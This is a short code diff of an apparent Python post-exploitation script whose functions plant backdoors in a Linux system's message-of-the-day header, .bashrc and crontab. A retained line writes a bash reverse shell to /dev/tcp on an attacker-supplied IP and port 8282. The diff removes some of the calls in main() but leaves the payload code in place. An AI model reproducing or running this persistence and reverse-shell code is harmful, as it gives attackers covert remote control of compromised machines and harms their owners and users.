@@ -20,10 +20,7 @@ def backDoorMessageOfTheDay(ip):
 		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"&') #update the ip and port accordingly
 
 def main():
-	attackBoxIP = sys.argv[1] #first command line argument is the ip of teh box you want to set the reverse shells to connect back to
-	backDoorMessageOfTheDay(attackBoxIP)
 	backDoorBashRC()
-	createCronTabBackDoor(attackBoxIP)
 
 if __name__ == '__main__':
 	main()
